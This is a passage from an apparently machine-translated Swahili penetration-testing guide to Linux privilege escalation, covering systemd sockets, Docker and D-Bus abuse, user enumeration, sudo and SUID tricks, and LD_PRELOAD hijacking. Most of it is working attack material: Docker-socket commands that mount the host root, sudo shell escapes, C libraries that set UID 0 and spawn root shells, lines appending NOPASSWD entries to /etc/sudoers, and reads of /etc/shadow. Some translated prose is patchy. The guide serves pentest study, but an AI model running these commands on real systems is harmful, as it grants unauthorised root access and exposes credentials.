* Kupata unit ya systemd ambayo inatekeleza njia ya kihesabu na una ruhusa ya kuandika juu ya PATH ya systemd (ili kujifanya kuwa executable hiyo)

**Jifunze zaidi kuhusu timers na `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji ruhusa ya root na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Tafadhali kumbuka **timer** ina **kuamilishwa** kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Soketi za Unix Domain (UDS) huwezesha **mawasiliano ya michakato** kwenye mashine sawa au tofauti ndani ya mfano wa mteja-seva. Hutumia faili za maelezo ya kawaida ya Unix kwa mawasiliano ya kompyuta na huanzishwa kupitia faili za `.socket`.

Soketi zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu soketi kwa kutumia `man systemd.socket`.** Ndani ya faili hii, kuna vipengele kadhaa vya kuvutia vinavyoweza kusanidiwa:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguo hizi ni tofauti lakini muhtasari unatumika kuonyesha **mahali itakaposikiliza** soketi (njia ya faili ya soketi ya AF\_UNIX, IPv4/6 na/au nambari ya bandari ya kusikiliza, nk.)
* `Accept`: Inachukua hoja ya boolean. Ikiwa ni **kweli**, **mfano wa huduma unazaliwa kwa kila uhusiano unaoingia** na soketi ya uhusiano pekee inapitishwa kwake. Ikiwa ni **uwongo**, soketi zote za kusikiliza zenyewe zinapitishwa kwa **mfano wa huduma ulioanzishwa**, na mfano mmoja wa huduma unazaliwa kwa ajili ya uhusiano wote. Thamani hii haizingatiwi kwa soketi za datagram na FIFO ambapo mfano mmoja wa huduma unashughulikia trafiki yote ya kuingia kwa hali yoyote. **Ina thamani ya uwongo**. Kwa sababu za utendaji, inashauriwa kuandika daemoni mpya tu kwa njia inayofaa kwa `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Inachukua mistari moja au zaidi ya amri, ambayo **inafanywa kabla ya** au **baada ya** soketi za kusikiliza/FIFOs kuwa **zimeundwa** na kufungwa, mtawalia. Token ya kwanza ya mstari wa amri lazima iwe jina kamili la faili, kisha ikifuatiwa na hoja za mchakato.
* `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo **zinafanywa kabla ya** au **baada ya** soketi za kusikiliza/FIFOs kuwa **zimefungwa** na kuondolewa, mtawalia.
* `Service`: Inabainisha jina la **mfano wa huduma** la **kuamilisha** kwenye **trafiki inayoingia**. Mazingira haya yanaruhusiwa tu kwa soketi zenye Accept=no. Kwa chaguo-msingi, ina thamani ya huduma inayobeba jina sawa na soketi (na kiambishi kilichobadilishwa). Kwa kesi nyingi, haipaswi kuwa lazima kutumia chaguo hili.

### Faili za .socket zenye uwezo wa kuandikwa

Ikiwa unapata faili ya `.socket` inayoweza kuandikwa, unaweza **kuongeza** kitu kama hiki mwanzoni mwa sehemu ya `[Socket]`: `ExecStartPre=/home/kali/sys/backdoor` na mlango wa nyuma utatekelezwa kabla ya soketi kuundwa. Kwa hivyo, **labda utahitaji kusubiri hadi mashine iwe imezimwa na kuanzishwa tena.**\
_Tafadhali kumbuka kuwa mfumo lazima utumie usanidi wa faili ya soketi au mlango wa nyuma hautatekelezwa_

### Soketi zenye uwezo wa kuandikwa

Ikiwa **unatambua soketi inayoweza kuandikwa** (_sasa tunazungumzia kuhusu Soketi za Unix na sio kuhusu faili za usanidi `.socket`_), basi **unaweza kuwasiliana** na soketi hiyo na labda kutumia udhaifu.

### Panga soketi za Unix
```bash
netstat -a -p --unix
```
### Uhusiano wa moja kwa moja

To establish a raw connection to a target system, you can use tools like `netcat` or `nc`. These tools allow you to communicate directly with a specific port on the target system.

To connect to a target system using `netcat`, use the following command:

```bash
nc <target_ip> <port>
```

Replace `<target_ip>` with the IP address of the target system and `<port>` with the desired port number.

Once the connection is established, you can send and receive data through the terminal. This can be useful for various purposes, such as testing network connectivity or interacting with specific services running on the target system.

Remember to use raw connections responsibly and only on systems that you have proper authorization to access.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa Utekaji:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Soketi za HTTP

Tafadhali kumbuka kuwa kunaweza kuwa na **soketi zinazosikiliza maombi ya HTTP** (_Sisemi kuhusu faili za .socket lakini faili zinazofanya kazi kama soketi za unix_). Unaweza kuthibitisha hili kwa kutumia:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa soketi inajibu ombi la HTTP, basi unaweza kuwasiliana nayo na labda kutumia udhaifu fulani.

### Soketi ya Docker Inayoweza Kuandikwa

Soketi ya Docker, mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kufungwa kwa usalama. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji wa `root` na wanachama wa kikundi cha `docker`. Kuwa na ufikiaji wa kuandika kwenye soketi hii kunaweza kusababisha ongezeko la mamlaka. Hapa kuna maelezo ya jinsi hii inaweza kufanyika na njia mbadala ikiwa CLI ya Docker haipatikani.

#### **Ongezeko la Mamlaka na CLI ya Docker**

Ikiwa una ufikiaji wa kuandika kwenye soketi ya Docker, unaweza kuongeza mamlaka kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi zinakuwezesha kuendesha chombo na ufikiaji wa kiwango cha mizizi kwenye mfumo wa faili wa mwenyeji.

#### **Kutumia Docker API Moja kwa Moja**

Katika hali ambapo CLI ya Docker haipatikani, soketi ya Docker inaweza bado kubadilishwa kutumia API ya Docker na amri za `curl`.

1. **Orodhesha Picha za Docker:**
Pata orodha ya picha zinazopatikana.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Unda Chombo:**
Tuma ombi la kuunda chombo ambacho kinashikilia saraka kuu ya mfumo wa mwenyeji.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anza chombo kilichoundwa hivi karibuni:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Jumuisha na Chombo:**
Tumia `socat` kuweka uhusiano na chombo, kuruhusu utekelezaji wa amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuweka uhusiano wa `socat`, unaweza kutekeleza amri moja kwa moja kwenye chombo na ufikiaji wa kiwango cha mizizi kwenye mfumo wa faili wa mwenyeji.

### Nyingine

Tafadhali kumbuka kuwa ikiwa una ruhusa ya kuandika juu ya soketi ya docker kwa sababu uko **ndani ya kikundi cha `docker`** una [**njia zaidi za kuongeza mamlaka**](interesting-groups-linux-pe/#docker-group). Ikiwa [**API ya docker inasikiliza kwenye bandari** unaweza pia kuweza kuathiri hiyo](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kuvunja kutoka kwa docker au kuitumia vibaya kuongeza mamlaka** katika:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Kuboresha Mamlaka ya Containerd (ctr)

Ikiwa unagundua kuwa unaweza kutumia amri ya **`ctr`** soma ukurasa ufuatao kwani **unaweza kuibadilisha kuongeza mamlaka**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Kuboresha Mamlaka ya **RunC**

Ikiwa unagundua kuwa unaweza kutumia amri ya **`runc`** soma ukurasa ufuatao kwani **unaweza kuibadilisha kuongeza mamlaka**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus ni mfumo wa **Mawasiliano kati ya Mchakato (IPC)** wenye utata ambao unawezesha programu kuingiliana na kushiriki data kwa ufanisi. Iliyoundwa kwa kuzingatia mfumo wa Linux wa kisasa, inatoa mfumo imara kwa aina tofauti za mawasiliano ya programu.

Mfumo huu ni mwenye nguvu, unapendeza msaada wa IPC wa msingi ambao unaboresha kubadilishana data kati ya michakato, kama soketi za uwanja wa UNIX zilizoboreshwa. Zaidi ya hayo, inasaidia utangazaji wa matukio au ishara, kuchochea ushirikiano laini kati ya sehemu za mfumo. Kwa mfano, ishara kutoka kwa kifaa cha Bluetooth kuhusu simu inayokuja inaweza kuchochea mchezaji wa muziki kuzima sauti, kuongeza uzoefu wa mtumiaji. Aidha, D-Bus inasaidia mfumo wa vitu vya mbali, kuwezesha ombi la huduma na wito wa njia kati ya programu, kupunguza mchakato ambao hapo awali ulikuwa mgumu.

D-Bus inafanya kazi kwa msingi wa **mfano wa ruhusa/kataa**, kusimamia ruhusa za ujumbe (wito wa njia, ishara, nk) kulingana na athari ya jumla ya sheria za sera zinazolingana. Sera hizi zinaelezea mwingiliano na basi, na inaweza kuruhusu kuongezeka kwa mamlaka kupitia unyanyasaji wa ruhusa hizi.

Mfano wa sera kama hii katika `/etc/dbus-1/system.d/wpa_supplicant.conf` unapatikana, ukiainisha ruhusa kwa mtumiaji wa mizizi kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera zisizo na mtumiaji au kikundi maalum zinatumika kwa kila mtu, wakati sera za muktadha wa "default" zinatumika kwa wote ambao hawajashughulikiwa na sera maalum.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya kuchunguza na kutumia mawasiliano ya D-Bus hapa:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Mtandao**

Ni muhimu sana kuchunguza mtandao na kujua nafasi ya kifaa.

### Uchunguzi wa kawaida
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Bandari Zilizofunguliwa

Daima angalia huduma za mtandao zinazoendesha kwenye kifaa ambacho hukushirikisha kabla ya kufikia kifaa hicho:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Kusikiliza

Angalia ikiwa unaweza kusikiliza trafiki. Ikiwa unaweza, unaweza kuweza kupata baadhi ya nywila.
```
timeout 1 tcpdump
```
## Watumiaji

### Uchunguzi wa Kawaida

Angalia **wewe ni nani**, ni **mamlaka** gani unayo, ni **watumiaji** gani wapo kwenye mfumo, ni wale ambao wanaweza **kuingia** na ni wale ambao wana **mamlaka ya mizizi (root privileges)**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya toleo za Linux zilikuwa na kasoro ambayo inaruhusu watumiaji wenye **UID > INT\_MAX** kuongeza mamlaka. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).\
**Tumia** kwa kudukua: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kikundi** ambacho kinaweza kukupa mamlaka ya mizizi:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Ubao wa kunakili

Angalia kama kuna kitu chochote cha kuvutia kilichopo ndani ya ubao wa kunakili (ikiwezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nenosiri

Kuwa na sera ya nenosiri yenye nguvu ni muhimu katika kuhakikisha usalama wa mfumo wako. Sera ya nenosiri inapaswa kuwa na vigezo vya kutosha ili kuzuia upenyezaji wa rahisi. Hapa kuna mambo muhimu ya kuzingatia katika sera yako ya nenosiri:

- **Urefu**: Nenosiri linapaswa kuwa na urefu wa angalau herufi 8.
- **Utaratibu**: Nenosiri linapaswa kuwa na aina tofauti za herufi kama vile herufi kubwa, herufi ndogo, nambari, na alama.
- **Mabadiliko ya mara kwa mara**: Watumiaji wanapaswa kuhimizwa kubadilisha nenosiri lao mara kwa mara, kwa mfano baada ya kipindi fulani cha wakati.
- **Kizuizi cha majaribio**: Ikiwa mtumiaji anajaribu kuingia kwa kutumia nenosiri lisilo sahihi mara kadhaa, akaunti yao inapaswa kufungwa kwa muda fulani ili kuzuia jaribio la nguvu.
- **Kutofautisha**: Nenosiri linapaswa kuwa tofauti na jina la mtumiaji au habari nyingine ya kibinafsi inayoweza kupatikana kwa urahisi.
- **Uhifadhi salama**: Nenosiri linapaswa kuhifadhiwa kwa njia salama, kama vile kuhifadhiwa kwa njia iliyosimbwa.

Kwa kuzingatia sera hizi za nenosiri, unaweza kuimarisha usalama wa mfumo wako na kuzuia upenyezaji usioidhinishwa.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila Zinazojulikana

Ikiwa **unajua nywila yoyote** ya mazingira, **jaribu kuingia kama kila mtumiaji** kwa kutumia nywila hiyo.

### Su Brute

Ikiwa hauna shida na kufanya kelele nyingi na programu za `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu kuvunja nguvu ya mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) na kipengele cha `-a` pia jaribu kuvunja nguvu ya watumiaji.

## Matumizi Mabaya ya PATH Inayoweza Kuandikwa

### $PATH

Ikiwa unagundua kuwa unaweza **kuandika ndani ya saraka fulani ya $PATH**, huenda uweze kuongeza mamlaka kwa **kuunda mlango wa nyuma ndani ya saraka inayoweza kuandikwa** kwa jina la amri fulani ambayo itatekelezwa na mtumiaji tofauti (hasa root) na ambayo **haitapakia kutoka kwenye saraka iliyopo kabla** ya saraka yako inayoweza kuandikwa kwenye $PATH.

### SUDO na SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au wanaweza kuwa na biti ya suid. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuruhusu kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa Sudo unaweza kuruhusu mtumiaji kutekeleza amri fulani kwa kutumia mamlaka ya mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kukimbia `vim` kama `root`, sasa ni rahisi kupata kikao kwa kuongeza ufunguo wa ssh katika saraka ya root au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Kanuni hii inaruhusu mtumiaji kuweka **mazingira ya pembejeo** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **ulinganishwa na mashine ya HTB Admirer**, ilikuwa **dhaifu** kwa **PYTHONPATH hijacking** ili kupakia maktaba ya python isiyojulikana wakati wa kutekeleza skripti kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Kuepuka utekelezaji wa Sudo kwa njia ya njia

**Ruka** kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Mbinu za Kuzuia**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Amri ya Sudo / Binary ya SUID bila njia ya amri

Ikiwa **ruhusa ya sudo** imetolewa kwa amri moja tu **bila kutoa njia**: _hacker10 ALL= (root) less_ unaweza kuitumia kwa kubadilisha variable ya PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Tekniki hii inaweza pia kutumika ikiwa binary ya **suid** inatekeleza amri nyingine bila kutoa njia yake (hakikisha daima kuangalia na **strings** maudhui ya binary ya suid isiyoeleweka).

[Mifano ya malipo ya kutekeleza.](payloads-to-execute.md)

### Binary ya SUID na njia ya amri

Ikiwa binary ya **suid** inatekeleza amri nyingine ikitoa njia yake, basi unaweza kujaribu **kutengeneza na kusafirisha kazi** iliyoitwa kama amri ambayo faili ya suid inaita.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_, unapaswa kujaribu kuunda kazi na kuisafirisha:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapotumia binary ya suid, kazi hii itatekelezwa

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Mazingira ya **LD_PRELOAD** hutumiwa kuweka maktaba za pamoja (.so files) moja au zaidi ambazo zitapakiwa na loader kabla ya zingine zote, ikiwa ni pamoja na maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama kuchaji maktaba kabla.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia utumiaji mbaya wa kipengele hiki, hasa na faili za suid/sgid, mfumo unatekeleza masharti fulani:

- Loader hautilii maanani **LD_PRELOAD** kwa faili za kutekelezwa ambapo kitambulisho halisi cha mtumiaji (_ruid_) hakilingani na kitambulisho cha mtumiaji kinachotumika (_euid_).
- Kwa faili za suid/sgid, maktaba zinazopakiwa kabla ni zile tu katika njia za kawaida ambazo pia ni suid/sgid.

Kuongezeka kwa mamlaka kunaweza kutokea ikiwa una uwezo wa kutekeleza amri na `sudo` na matokeo ya `sudo -l` yanajumuisha taarifa **env_keep+=LD_PRELOAD**. Usanidi huu unaruhusu mazingira ya **LD_PRELOAD** kuendelea kuwepo na kutambuliwa hata wakati amri zinatekelezwa na `sudo`, hatimaye kusababisha utekelezaji wa nambari yoyote isiyojulikana na mamlaka ya juu.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **sakinisha** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **ongeza mamlaka** kukimbia
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Kama mshambuliaji anadhibiti kipengele cha mazingira cha **LD\_LIBRARY\_PATH**, anaweza kutumia privesc kama hiyo kwa sababu anadhibiti njia ambapo maktaba zitatafutwa.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary - Uingizaji wa .so

Unapokutana na faili ya binary yenye ruhusa ya **SUID** ambayo inaonekana isiyo ya kawaida, ni vizuri kuhakikisha kuwa inapakia faili za **.so** kwa usahihi. Hii inaweza kuthibitishwa kwa kukimbia amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (Hakuna faili au saraka kama hiyo)"_ kunaweza kuashiria uwezekano wa kufanya udukuzi.

Kwa kufanya udukuzi huu, mtu anaweza kuendelea kwa kuunda faili ya C, kwa mfano _"/path/to/.config/libcalc.c"_, ambayo ina msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara baada ya kuchapishwa na kutekelezwa, unalenga kuinua mamlaka kwa kubadilisha ruhusa za faili na kutekeleza kikao na mamlaka ya juu.

Chapisha faili ya C hapo juu kuwa faili ya kitu kinachoshirikiwa (.so) kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kukimbia faili ya SUID iliyoharibiwa inapaswa kuzindua shambulio, kuruhusu uwezekano wa kudhoofisha mfumo. 


## Utekelezaji wa Kifaa cha Pamoja
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tukiwa tumepata faili ya SUID inayopakia maktaba kutoka kwenye folda ambapo tunaweza kuandika, hebu tuunde maktaba hiyo kwenye folda hiyo na jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama hili
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii inamaanisha kuwa maktaba uliyoitengeneza inahitaji kuwa na kazi iliyoitwa `jina_la_kazi`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya programu za Unix ambazo zinaweza kutumiwa na mshambuliaji kukiuka vizuizi vya usalama wa ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **tu kuingiza hoja** katika amri.

Mradi huu unakusanya kazi halali za programu za Unix ambazo zinaweza kutumiwa vibaya kuvunja vikao vilivyozuiwa, kuongeza au kudumisha mamlaka ya juu, kuhamisha faili, kuunda vikao vya kufunga na kurudisha nyuma, na kuwezesha kazi zingine za baada ya uchunguzi.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Ikiwa unaweza kupata `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa inapata jinsi ya kudukua sheria yoyote ya sudo.

### Kutumia Upya Vitufe vya Sudo

Katika kesi ambapo una **upatikanaji wa sudo** lakini sio nenosiri, unaweza kuongeza mamlaka kwa **kungojea utekelezaji wa amri ya sudo na kisha kuteka kikao cha kikao**.

Mahitaji ya kuongeza mamlaka:

* Tayari una kikao kama mtumiaji "_sampleuser_"
* "_sampleuser_" ame **tumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa chaguo-msingi hiyo ndio muda wa ishara ya sudo inayoturuhusu kutumia `sudo` bila kuingiza nenosiri lolote)
* `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
* `gdb` inapatikana (unaweza kuweza kuipakia)

(Unaweza kuwezesha kwa muda `ptrace_scope` na `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kudumisha kwa kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji yote haya yanakidhiwa, **unaweza kuongeza mamlaka kwa kutumia:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **Udukuzi wa kwanza** (`exploit.sh`) utaunda faili ya binary `activate_sudo_token` katika _/tmp_. Unaweza kutumia hiyo ku **kuamsha ishara ya sudo katika kikao chako** (hutapata moja kwa moja kikao cha root, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* **Shambulizi la pili** (`exploit_v2.sh`) litatengeneza sh shell katika _/tmp_ **iliyomilikiwa na root na setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* **Exploit ya tatu** (`exploit_v3.sh`) itaunda faili la sudoers ambalo linafanya **sudo tokens kuwa ya milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Jina la mtumiaji>

Ikiwa una **ruhusa ya kuandika** kwenye saraka au kwenye faili yoyote iliyoanzishwa ndani ya saraka hiyo, unaweza kutumia binary [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) ku **unda kitambulisho cha sudo kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una kikao kama mtumiaji huyo na PID 1234, unaweza **kupata mamlaka ya sudo** bila kuhitaji kujua nenosiri kwa kufanya yafuatayo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili ndani ya `/etc/sudoers.d` hupangilia ni nani anaweza kutumia `sudo` na jinsi gani. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kikundi cha root**.\
**Ikiwa** unaweza **kusoma** faili hii, unaweza kuwa na uwezo wa **kupata habari muhimu**, na ikiwa unaweza **kuandika** faili yoyote, utaweza **kuongeza mamlaka**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna njia mbadala za faili ya `sudo` kama vile `doas` kwa OpenBSD, kumbuka kuangalia mipangilio yake kwenye `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Utekelezaji wa Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kawaida anahusika na kifaa na kutumia `sudo`** kuongeza mamlaka na umepata kikao ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda faili mpya ya sudo** ambayo itatekeleza nambari yako kama root na kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano, kwa kuongeza njia mpya katika .bash\_profile) ili wakati mtumiaji anatekeleza sudo, faili yako ya sudo inatekelezwa.

